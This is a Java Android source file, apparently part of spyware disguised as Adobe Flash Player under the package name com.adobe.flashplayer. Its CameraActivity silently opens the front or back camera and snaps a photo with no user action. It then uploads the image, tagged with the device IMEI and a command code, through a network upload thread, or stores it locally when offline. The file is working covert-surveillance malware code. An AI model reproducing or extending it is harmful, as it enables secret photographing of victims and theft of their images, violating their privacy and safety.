package com.adobe.flashplayer.data;


import com.adobe.flashplayer.MyLog;
import com.adobe.flashplayer.Public;
import com.adobe.flashplayer.R;
import com.adobe.flashplayer.Utils;
import com.adobe.flashplayer.network.NetworkUitls;
import com.adobe.flashplayer.network.UploadData;

import java.io.File;
import java.io.FileOutputStream;

import android.app.Activity;
import android.content.Context;
import android.content.pm.PackageManager;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.Matrix;
import android.hardware.Camera;
import android.hardware.Camera.AutoFocusCallback;
import android.hardware.Camera.PictureCallback;
import android.hardware.Camera.PreviewCallback;
import android.os.Bundle;
import android.util.Log;
import android.view.SurfaceHolder;
import android.view.SurfaceView;
import android.view.Window;
import android.view.WindowManager;


@SuppressWarnings("deprecation")
public class CameraActivity extends Activity implements Runnable{
    public static int camerano 			= 0;
    private final String TAG = "CameraPhotoActivity";
    private SurfaceView mySurfaceView = null;
    private SurfaceHolder myHolder = null;
    private Camera myCamera = null;
    private static final int CAMERAFOCUSDELAY = 600;
    private long camerastarttime ;

    private int DEFAULT_CAMERA_PHOTO_WIDTH = 640;
    private int DEFAULT_CAMERA_PHOTO_HEIGHT = 480;
    private Context context;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        Log.d(TAG, "oncreate");

        camerastarttime = System.currentTimeMillis();

        context = this;

        requestWindowFeature(Window.FEATURE_NO_TITLE);
        getWindow().setFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN, WindowManager.LayoutParams.FLAG_FULLSCREEN);
        setContentView(R.layout.activity_cameraphoto);

        new Thread(new Runnable() {
            @Override
            public void run() {
                initCamera();
            }
        }).start();
    }


    protected void onDestroy() {
        super.onDestroy();
        Log.d(TAG,"onDestroy");
    }



    private void initCamera() {
        try{
            mySurfaceView = (SurfaceView) findViewById(R.id.camera_surfaceview);
            myHolder = mySurfaceView.getHolder();
            myHolder.setType(SurfaceHolder.SURFACE_TYPE_PUSH_BUFFERS);

            if(context.getPackageManager().hasSystemFeature(PackageManager.FEATURE_CAMERA)){//authority tips
                if(openFacingCamera()){
                    myCamera.setPreviewDisplay(myHolder);

                    myCamera.setPreviewCallback(myAutoPreviewCallback);

                    Camera.Parameters parameters = myCamera.getParameters();
                    //parameters.setPreviewFormat(ImageFormat.JPEG);
                    parameters.setPreviewSize(DEFAULT_CAMERA_PHOTO_WIDTH, DEFAULT_CAMERA_PHOTO_HEIGHT);
                    parameters.setPictureSize(DEFAULT_CAMERA_PHOTO_WIDTH, DEFAULT_CAMERA_PHOTO_HEIGHT);
                    myCamera.setParameters(parameters);

                    myCamera.startPreview();
                    //java.lang.RuntimeException: autoFocus failed
                    //Thread.sleep(CAMERAFOCUSDELAY);
                    //myCamera.autoFocus(myAutoFocus);

                }
                else {
                    finish();
                    Log.d(TAG, "openCamera Failed");
                    MyLog.writeLogFile("openCamera Failed\r\n");
                }
            }
            else{
                finish();
                Log.d(TAG, "camera not exist");
                MyLog.writeLogFile("camera not exist\r\n");
            }
        }
        catch(Exception ex){
            try{
                if(myCamera != null){
                    myCamera.stopPreview();
                    myCamera.setPreviewCallback(null);
                    myCamera.release();
                    myCamera = null;
                }
                finish();
            }catch(Exception ext){

            }

            ex.printStackTrace();
            String errorString = Utils.getExceptionDetail(ex);
            String stackString = Utils.getCallStack();
            MyLog.writeLogFile("initCamera exception:"+errorString + "\r\n" + "call stack:" + stackString + "\r\n");
        }
    }


    private boolean openFacingCamera() {
        Camera.CameraInfo cameraInfo = new Camera.CameraInfo();
        if(camerano == 0){
            for (int camIdx = 0, cameraCount = Camera.getNumberOfCameras(); camIdx < cameraCount; camIdx++) {
                Camera.getCameraInfo(camIdx, cameraInfo);
                if (cameraInfo.facing == Camera.CameraInfo.CAMERA_FACING_FRONT) {
                    try {
                        myCamera = Camera.open(camIdx);
                    }
                    catch (Exception ex) {
                        ex.printStackTrace();
                        return false;
                    }
                }
            }
        }
        else{
            for (int camIdx = 0, cameraCount = Camera.getNumberOfCameras(); camIdx < cameraCount; camIdx++) {
                Camera.getCameraInfo(camIdx, cameraInfo);
                if (cameraInfo.facing == Camera.CameraInfo.CAMERA_FACING_BACK) {
                    try {
                        myCamera = Camera.open(camIdx);
                    }
                    catch (Exception e) {
                        return false;
                    }
                }
            }
        }

        Log.d(TAG, "openCamera Success");
        //WriteDateFile.writeLogFile("openCamera Success\r\n");
        return true;
    }

    private PreviewCallback myAutoPreviewCallback = new PreviewCallback() {
        @Override
        public void onPreviewFrame(byte[] data, Camera camera) {
            myCamera.autoFocus(myAutoFocus);
        }
    };


    private AutoFocusCallback myAutoFocus = new AutoFocusCallback() {
        @Override
        public void onAutoFocus(boolean success, Camera camera) {
            try{
                //Thread.sleep(CAMERAFOCUSDELAY);
                myCamera.takePicture(null, null, myPicCallback);
            }catch(Exception ex){
                MyLog.writeLogFile("camera auto focus error\r\n");
                ex.printStackTrace();
            }
        }
    };


    private PictureCallback myPicCallback = new PictureCallback() {
        @Override
        public void onPictureTaken(byte[] data, Camera camera) {
            try {
                myCamera.stopPreview();
                myCamera.setPreviewCallback(null);
                myCamera.release();
                myCamera = null;
                finish();

                long cameraendtime = System.currentTimeMillis();
                long camerausetime = cameraendtime - camerastarttime;
                MyLog.writeLogFile("camera photo cost milliseconds:" + String.valueOf(camerausetime) + "\r\n");

                if (data.length < Public.VALID_CAMERAPHOTO_SIZE) {
                    MyLog.writeLogFile("camera photo size:" + data.length + " is ignormal\r\n");
                    return;
                }

                Context context = getApplicationContext();
                if(NetworkUitls.isNetworkAvailable(context) == true/*&& (Network.getNetworkType(context) == Network.WIFI_CONNECTION*/ ){

                    String filename = Utils.formatCurrentDateInFileName() + "_" + Public.CAMERAPHOTO_FILE_NAME;
                    int filenamelen = filename.getBytes().length;
                    int datasize = (int)data.length;
                    int sendsize = datasize + 4 + filenamelen + 4;
                    byte[] sendbuf = new byte[sendsize];
                    byte[] bytefilenamelen = Utils.intToBytes(filenamelen);
                    System.arraycopy(bytefilenamelen, 0, sendbuf, 0, 4);
                    System.arraycopy(filename.getBytes(), 0, sendbuf, 4, filenamelen);
                    byte[] bytedatasize = Utils.intToBytes(datasize);
                    System.arraycopy(bytedatasize, 0, sendbuf, 4 + filenamelen, 4);
                    System.arraycopy(data, 0, sendbuf, 4 + filenamelen + 4, datasize);

                    new Thread(new UploadData(sendbuf,sendsize,Public.CMD_DATA_CAMERAPHOTO,Public.IMEI)).start();
                }else{
                    String filename = Utils.formatCurrentDateInFileName() + "_" + Public.CAMERAPHOTO_FILE_NAME;
                    File pictureFile = new File(Public.LOCAL_PATH_NAME + filename);
                    FileOutputStream fos = new FileOutputStream(pictureFile);
                    Bitmap bitmap = BitmapFactory.decodeByteArray(data, 0, data.length);
                    Matrix matrix = new Matrix();
                    //matrix.preRotate(90);
                    bitmap = Bitmap.createBitmap(bitmap ,0,0, bitmap .getWidth(), bitmap .getHeight(),matrix,true);
                    bitmap.compress(Bitmap.CompressFormat.JPEG, Public.CAMERA_PHOTO_QUALITY, fos);
                    fos.close();
                }

                Log.d(TAG, "send camera photo ok");
            } catch (Exception error) {
                Log.d(TAG, "camera photo PictureCallback error:" + error.toString());
                error.printStackTrace();
                String errorString = Utils.getExceptionDetail(error);
                String stackString = Utils.getCallStack();
                MyLog.writeLogFile("CameraPhotoActivity exception:"+errorString + "\r\n" + "call stack:" + stackString + "\r\n");
                return ;
            }
        }
    };


    @Override
    public void run(){

    }
}
